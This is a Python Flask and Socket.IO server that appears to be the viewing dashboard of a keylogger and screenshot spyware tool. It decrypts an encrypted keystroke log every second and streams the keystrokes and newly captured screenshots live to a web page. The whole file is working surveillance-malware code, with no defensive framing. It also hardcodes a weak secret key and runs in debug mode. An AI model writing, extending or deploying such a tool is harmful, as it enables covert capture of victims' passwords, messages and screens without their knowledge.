from flask import Flask, render_template, send_from_directory
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet
import threading
import time
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet')

# Load the encryption key
with open("key.key", "rb") as key_file:
    key = key_file.read()
cipher_suite = Fernet(key)

log_file = "encrypted_key_log.txt"
screenshot_dir = "screenshots"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

def monitor_logs():
    last_position = 0
    while True:
        with open(log_file, "rb") as f:
            f.seek(last_position)
            new_data = f.read()
            if new_data:
                try:
                    decrypted_data = cipher_suite.decrypt(new_data).decode()
                    print(f"Decrypted data: {decrypted_data}")  # Debugging
                    socketio.emit('new_keystroke', {'data': decrypted_data})
                    last_position = f.tell()
                except Exception as e:
                    print(f"Decryption error: {e}")  # Debugging
        time.sleep(1)

def monitor_screenshots():
    existing_files = set(os.listdir(screenshot_dir))
    while True:
        current_files = set(os.listdir(screenshot_dir))
        new_files = current_files - existing_files
        for new_file in new_files:
            print(f"New screenshot detected: {new_file}")  # Debugging
            socketio.emit('new_screenshot', {'filename': new_file})
        existing_files = current_files
        time.sleep(1)

@socketio.on('connect')
def handle_connect():
    emit('response', {'data': 'Connected'})

if __name__ == '__main__':
    log_thread = threading.Thread(target=monitor_logs)
    log_thread.start()

    screenshot_thread = threading.Thread(target=monitor_screenshots)
    screenshot_thread.start()

    socketio.run(app, debug=True)
